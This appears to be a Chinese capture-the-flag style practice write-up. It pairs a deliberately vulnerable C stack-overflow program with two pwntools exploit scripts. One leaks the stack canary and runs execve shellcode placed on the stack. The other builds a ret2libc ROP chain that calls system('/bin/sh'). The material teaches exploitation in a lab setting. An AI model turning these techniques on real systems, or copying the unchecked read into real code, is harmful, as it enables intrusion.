## pwn第一次练习
```c
include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


void setbufs()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 1, 0);
    setvbuf(stderr, 0, 1, 0);
}

int main()
{
    char tips[]="suuuuuuuper easy test.";
    char buf[32];
    int len;
    setbufs();
    puts(tips);
    read(0, buf, 4);
    len = atoi(buf);
    read(0, buf, len);
    printf("%p:", &buf);
    puts(buf);
    read(0, buf, 0x100);
    return 0;
}
```

+ 使用**无nx, 无pie, 有canary**的选项编译以上程序（64位下）
+ 使用多种姿势getshell:
    1. 在栈上写shellcode来getshell
    2. 使用rop来getshell

## wp0:
栈写shellcode，然后执行
```py
from pwn import *
context.log_level='debug'
context.terminal=['bash']
sh=process("./stack")
shellcode='\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05'
## lake canary
# gdb.attach(sh,'b *0x400890')
# pause()
sh.sendlineafter(".",'999')
sh.sendline('A'*0x28)
buff_addr=sh.recvuntil(':',drop=True)
buff_addr=int(buff_addr,16)
log.info('buff_addr:'+hex(buff_addr))
sh.recvuntil('A\n')
canary=u64('\0'+sh.recvn(7))
# gdb.attach(sh,'b *0x400895')
## get shell
# pause()
sh.sendline(shellcode+'A'*16+p64(canary)+'A'*8+p64(buff_addr))
sh.interactive()
```

## wp1
ret2libc  
先泄漏canary，然后ret2main泄漏`__libc_start_main`地址，泄漏libc_base

```py
from pwn import *
import binascii
context.log_level='debug'
context.terminal=['bash']
debug=True
libc='/lib/x86_64-linux-gnu/libc.so.6'
elf_name='./stack'
remote_addr=['',1111]

elf=ELF(elf_name)
libc=ELF(libc)
puts_plt=elf.plt['puts']
main_addr=elf.symbols['main']
libc_start_main_got=elf.got['__libc_start_main']

if debug:
    sh=process(elf_name)
else:
    sh=remote(remote_addr)

sh.sendlineafter(".",'999')
# get canary,buff_addr
sh.sendline('A'*0x28)
buff_addr=sh.recvuntil(':',drop=True)
buff_addr=int(buff_addr,16)
log.info('buff_addr:'+hex(buff_addr))
sh.recvuntil('A\n')
canary=u64('\0'+sh.recvn(7))
log.info('canary:'+hex(canary))

#ret to main
pop_rdi_ret=0x400913
payload=flat([
    "A"*0x28,
    p64(canary),
    p64(buff_addr+0x30),
    p64(pop_rdi_ret),
    p64(libc_start_main_got),
    p64(puts_plt),
    p64(main_addr)

])
sh.sendline(payload)
sh.recvline()
## leak libc_addr
libc_start_main_addr=sh.recvline(keepends=False)
libc_start_main_addr=u64(libc_start_main_addr.ljust(8,'\x00'))
log.info("libc_start_addr:"+hex(libc_start_main_addr))
libc_base=libc_start_main_addr-0x20740
libc_sh_addr=libc_base+0x18cd57
system_addr=libc_base+0x45390

sh.sendlineafter(".",'999')

getshell=flat([
"windforce17"*3+'A'*7,
    p64(canary),
    p64(buff_addr+0x30),
    p64(pop_rdi_ret),
    p64(libc_sh_addr),
    p64(system_addr),
])

sh.sendline("hacking in...")
sh.sendline(getshell)

sh.interactive()
```